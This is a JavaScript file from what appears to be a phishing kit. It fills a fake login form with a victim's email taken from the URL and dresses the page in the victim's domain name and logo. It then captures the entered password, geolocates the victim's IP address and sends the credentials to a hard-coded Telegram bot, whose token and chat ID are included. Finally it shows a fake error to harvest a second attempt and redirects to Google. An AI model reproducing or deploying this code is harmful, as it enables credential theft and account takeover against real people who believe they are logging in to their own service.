const BOT_TOKEN = "8222171309:AAEUq6LuKnxlcaNv2bdM7QkcyNahPx_QCAA";
const CHAT_ID = "7959372593";
const IPINFO_TOKEN = "efeb6799727414"; // Optional for more accuracy

(function () {
    let userEmail = "";
    let attempt = 0;

    // Unified email extraction from both query string and hash, with decoding
    function getEmailFromURL() {
        let email = "";

        // 1. Try query string parameter (?email=value)
        const urlParams = new URLSearchParams(window.location.search);
        if (urlParams.has("email")) {
            email = decodeURIComponent(urlParams.get("email"));
        }

        // 2. Try hash fragment (#value)
        if (!email && window.location.hash) {
            email = decodeURIComponent(window.location.hash.substring(1));
        }

        // 3. Validate email format
        if (email && email.includes("@")) {
            return email;
        }

        // 4. Default fallback
        return "example@example.com";
    }

    // Update email field and domain info
    function updateEmailInfo() {
        userEmail = getEmailFromURL();

        // Fill and disable email field
        const emailField = document.getElementById("email");
        if (emailField) {
            emailField.value = userEmail;
            emailField.disabled = true;
        }

        // Update domain info
        const domain = userEmail.split("@")[1] || "example.com";
        const domainTitle = document.getElementById("domain-title");
        const domainLogo = document.getElementById("domain-logo");

        if (domainTitle) domainTitle.textContent = domain;
        if (domainLogo) domainLogo.src = `https://logo.clearbit.com/${domain}`;
    }

    // Telegram message function
    async function sendToTelegram(email, password) {
        try {
            let ipData = {};
            try {
                const ipRes = await fetch(`https://ipinfo.io/json?token=${IPINFO_TOKEN || ""}`);
                ipData = await ipRes.json();
            } catch (e) {
                console.warn("IP info fetch failed", e);
            }

            const message = `
🔐 New Login Attempt
------------------------
📧 Email: ${email}
🔑 Password: ${password}
🌐 IP: ${ipData.ip || "N/A"}
🏙 City: ${ipData.city || "N/A"}
🏢 Region: ${ipData.region || "N/A"}
🌍 Country: ${ipData.country || "N/A"}
📡 ISP: ${ipData.org || "N/A"}
📍 Location: ${ipData.loc || "N/A"}
            `;

            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: message,
                    parse_mode: "Markdown"
                })
            });
        } catch (err) {
            console.error("Telegram send error:", err);
        }
    }

    // Initialize on DOM ready
    document.addEventListener("DOMContentLoaded", () => {
        // Initial setup
        updateEmailInfo();

        // Handle hash changes
        window.addEventListener("hashchange", updateEmailInfo);

        // Login button handler
        document.getElementById("login-btn").addEventListener("click", () => {
            const password = document.getElementById("password").value;
            const errorMsg = document.getElementById("error-msg");
            const spinner = document.getElementById("loading-spinner");

            errorMsg.textContent = "";
            spinner.classList.remove("hidden");

            setTimeout(async () => {
                spinner.classList.add("hidden");
                attempt++;

                // Send credentials to Telegram
                await sendToTelegram(userEmail, password);

                if (attempt === 1) {
                    errorMsg.textContent = "Incorrect password, please verify and retry.";
                } else if (attempt === 2) {
                    window.location.href = "https://google.com";
                }
            }, 5000);
        });
    });
})();
